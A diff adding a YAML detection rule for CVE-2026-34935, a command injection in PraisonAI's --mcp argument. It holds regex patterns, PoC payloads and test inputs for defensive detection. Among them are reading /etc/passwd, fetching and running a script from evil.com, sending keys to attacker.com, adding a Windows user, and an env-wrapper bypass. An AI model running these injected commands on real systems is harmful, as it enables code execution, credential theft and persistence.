@@ -1,0 +1,186 @@
+title: "PraisonAI parse_mcp_command() CLI Argument Command Injection (CVE-2026-34935)"
+id: ATR-2026-00540
+rule_version: 1
+status: draft
+description: >
+  Detects CVE-2026-34935 (CVSS ~9.8 CRITICAL, CWE-78 / GHSA-9qhq-v63v-fv3j):
+  PraisonAI 4.5.15–4.5.68 passes the --mcp CLI argument directly to
+  parse_mcp_command(), which calls shlex.split() and then anyio.open_process()
+  without any validation. An attacker-controlled --mcp value containing a shell
+  interpreter with an inline-exec flag (-c, -e, --exec) or shell metacharacters
+  reaches the OS as a live subprocess, enabling arbitrary code execution.
+
+  PoC payloads: `--mcp "bash -c 'cat /etc/passwd'"` and
+  `--mcp "python -c 'import os; os.system(\"id\")'"`
+
+  Detection covers:
+  (a) --mcp argument values containing a shell interpreter with inline-exec flag;
+  (b) --mcp values with shell metacharacters (pipe, ampersand, backtick, $());
+  (c) praisonai CLI invocations with subprocess execution primitives in --mcp.
+
+  Complements ATR-2026-00531 (PraisonAI HTTP API auth bypass) and
+  ATR-2026-00528 (PraisonAI AUTH_ENABLED hardcoded default).
+author: "ATR Community"
+date: "2026/05/28"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: draft
+severity: critical
+
+references:
+  owasp_llm:
+    - "LLM05:2025 - Improper Output Handling"
+  owasp_agentic:
+    - "ASI05:2026 - Unexpected Code Execution"
+  mitre_atlas:
+    - "AML.T0049 - Exploit Public-Facing Application"
+    - "AML.T0040 - ML Model Inference API Access"
+  mitre_attack:
+    - "T1059 - Command and Scripting Interpreter"
+    - "T1190 - Exploit Public-Facing Application"
+  cve:
+    - "CVE-2026-34935"
+
+metadata_provenance:
+  mitre_atlas: human-reviewed
+  owasp_llm: human-reviewed
+  owasp_agentic: human-reviewed
+
+compliance:
+  eu_ai_act:
+    - article: "15"
+      context: >
+        CVE-2026-34935 passes the --mcp CLI argument without sanitization into
+        anyio.open_process(); Article 15 cybersecurity requirements mandate that
+        AI agent CLI interfaces validate user-controlled parameters before any
+        subprocess execution.
+      strength: primary
+  nist_ai_rmf:
+    - subcategory: "MP.5.1"
+      context: >
+        Attacker-controlled --mcp values reaching anyio.open_process() constitute
+        an adversarial input attack; MP.5.1 requires scanning MCP CLI arguments
+        for inline-exec flags and shell metacharacters.
+      strength: primary
+  iso_42001:
+    - clause: "8.6"
+      context: >
+        Operational controls must detect and block PraisonAI --mcp arguments
+        containing shell interpreter inline-exec primitives before process launch.
+      strength: primary
+
+tags:
+  category: tool-poisoning
+  subcategory: mcp-cli-command-injection
+  scan_target: both
+  confidence: high
+  source: cve-disclosure
+  vendor_sources: praisonai-cve-2026-34935
+
+agent_source:
+  type: llm_io
+  framework:
+    - praisonai
+    - any
+  provider:
+    - any
+
+detection:
+  condition: any
+  false_positives:
+    - "Legitimate praisonai --mcp usage with npx/uvx/python -m module paths — pattern requires -c/-e inline-exec flags."
+    - "Security advisory text quoting CVE-2026-34935 PoC payloads for documentation."
+    - "Automated MCP server startup scripts using safe invocation patterns (no -c or shell metacharacters)."
+  conditions:
+    - field: content
+      operator: regex
+      value: '(?i)--mcp\s+["\x27]?[^"\x27\n]{0,40}(?:(?:\/(?:usr\/)?(?:local\/)?bin\/)?(?:bash|sh|zsh)|cmd(?:\.exe)?|powershell(?:\.exe)?|pwsh)\s+-[cC]\s+'
+      description: >
+        --mcp argument with a shell binary and -c inline-exec flag —
+        direct CVE-2026-34935 PoC pattern (bash -c 'payload'). Matches
+        bare name (bash) and full path (/bin/bash, /usr/bin/bash).
+
+    - field: content
+      operator: regex
+      value: '(?i)--mcp\s+["\x27]?[^"\x27\n]{0,40}(?:python3?|perl|ruby|node|bun|deno)\s+-[ceE]\s+'
+      description: >
+        --mcp argument with an interpreter and -c/-e/-E inline-eval flag —
+        same root cause as bash -c but via scripting language interpreter
+
+    - field: content
+      operator: regex
+      value: '(?i)--mcp\s+["\x27]?[^"\x27\n]{0,100}(?:&&|\|\||\||;|`|\$\()'
+      description: >
+        --mcp argument containing shell metacharacters (&&, ||, pipe, semicolon,
+        backtick, subshell) — command chaining / injection surface
+
+    - field: content
+      operator: regex
+      value: '(?i)(?:parse_mcp_command|mcp_command_parser|praisonai[^\n]{0,80}--mcp)[^\n]{0,200}(?:inject|exec|exploit|bypass|rce|shell|command[\s_-]?injection)'
+      description: >
+        Explicit parse_mcp_command / praisonai --mcp reference combined with
+        exploitation language — attack framing in skill or tool description
+
+response:
+  actions:
+    - alert
+    - block_tool
+  message_template: >
+    [ATR-2026-00540] CRITICAL: PraisonAI --mcp argument contains shell interpreter
+    with inline-exec flag or metacharacters (CVE-2026-34935, CWE-78).
+    PraisonAI 4.5.15-4.5.68 passes this value directly to anyio.open_process()
+    without validation. Block execution; upgrade PraisonAI to a patched version
+    or enforce an allowlist on --mcp values.
+
+confidence: 86
+
+wild_fp_rate: 0
+
+test_cases:
+  true_positives:
+    - input: "--mcp \"bash -c 'cat /etc/passwd'\""
+      expected: triggered
+      description: "Direct CVE-2026-34935 PoC: bash -c with shell payload"
+    - input: "--mcp 'python -c \"import os; os.system(\\\"id\\\")\"'"
+      expected: triggered
+      description: "python -c with os.system() inline RCE"
+    - input: "--mcp 'sh -c wget evil.com/shell.sh | bash'"
+      expected: triggered
+      description: "sh -c with wget download-and-exec chain"
+    - input: "--mcp 'node -e require(\"child_process\").execSync(\"whoami\")'"
+      expected: triggered
+      description: "node -e JavaScript inline exec"
+    - input: "--mcp 'perl -e system(\"mkdir /tmp/pwned\")'"
+      expected: triggered
+      description: "perl -e system() one-liner"
+    - input: "--mcp 'bash -c evil && curl http://attacker.com/keys'"
+      expected: triggered
+      description: "--mcp with && command chaining"
+    - input: "--mcp 'cmd.exe -c net user hacker P@ss /add'"
+      expected: triggered
+      description: "Windows cmd.exe -c in --mcp argument"
+
+  true_negatives:
+    - input: "--mcp 'npx @modelcontextprotocol/server-filesystem /data'"
+      expected: not_triggered
+      description: "Legitimate npx MCP server — no -c flag, no metacharacters"
+    - input: "--mcp 'python -m mcp_server_weather --port 8080'"
+      expected: not_triggered
+      description: "python -m module invocation — not -c inline-exec"
+    - input: "--mcp 'uvx ruff-mcp'"
+      expected: not_triggered
+      description: "uvx launcher — safe pattern"
+    - input: "--mcp 'node /usr/local/lib/mcp-server.js'"
+      expected: not_triggered
+      description: "node running a file — not -e inline-exec"
+    - input: "Upgrade PraisonAI to fix CVE-2026-34935"
+      expected: not_triggered
+      description: "Mitigation advisory without exploit content"
+
+evasion_tests:
+  - input: "--mcp '/usr/bin/env bash -c id'"
+    expected: not_triggered
+    bypass_technique: env_wrapper_to_shell
+    notes: >
+      /usr/bin/env as the first token bypasses the shell-binary detection in
+      pattern 1. v2 should add /usr/bin/env + shell-as-next-arg detection.
